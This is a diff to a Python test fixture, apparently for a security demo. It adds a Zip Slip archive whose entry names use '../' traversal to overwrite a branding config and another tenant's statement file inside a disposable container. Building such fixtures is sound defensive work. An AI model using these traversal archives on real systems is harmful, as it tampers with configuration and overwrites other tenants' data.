@@ -41,3 +41,26 @@ def well_formed_archive() -> bytes:
 def traversing_archive() -> bytes:
     """An archive whose entry name escapes the extraction directory (Zip Slip)."""
     return _zip_of({TRAVERSING_MEMBER: TRAVERSING_BODY.encode()})
+
+
+# --- Zip-Slip write payload (the two documented write targets) -------------------------
+#
+# The write escape lands only on these two fixture paths, both inside the disposable
+# in-container tree: the branding config the app reads back (impact observable through the
+# legitimate summary), and one other tenant's statement document (cross-tenant overwrite).
+ATTACKER_FOOTER = "PWNED-BY-ZIP-SLIP (demo)"
+ATTACKER_BRANDING = f"[branding]\nfooter = {ATTACKER_FOOTER}\n"
+ATTACKER_STATEMENT = "OVERWRITTEN by a cross-tenant Zip-Slip write (synthetic demo).\n"
+
+ZIP_SLIP_BRANDING_ENTRY = TRAVERSING_MEMBER  # "../../config/branding.conf"
+ZIP_SLIP_CROSS_TENANT_ENTRY = "../northwind-mills/statement-2026-07.txt"
+
+
+def zip_slip_write_archive() -> bytes:
+    """An archive whose two traversing entries escape to the documented write targets."""
+    return _zip_of(
+        {
+            ZIP_SLIP_BRANDING_ENTRY: ATTACKER_BRANDING.encode(),
+            ZIP_SLIP_CROSS_TENANT_ENTRY: ATTACKER_STATEMENT.encode(),
+        }
+    )
